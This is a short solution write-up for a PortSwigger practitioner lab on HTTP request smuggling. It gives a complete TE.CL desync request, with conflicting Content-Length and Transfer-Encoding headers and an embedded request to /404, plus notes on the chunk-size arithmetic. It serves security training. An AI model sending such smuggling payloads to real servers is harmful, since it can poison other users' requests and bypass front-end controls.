# Lab 06 — HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

> **Practitioner** · [Official lab](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)

**Entry point:** detect the TE.CL desync safely.

## Solution

Repeater with "Update Content-Length" **off**; send twice:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

(chunk size `5e` = 94 bytes must match the embedded request exactly; keep
the trailing `\r\n\r\n` after the final `0`.)

The second response is **404** — TE.CL confirmed, lab solved.
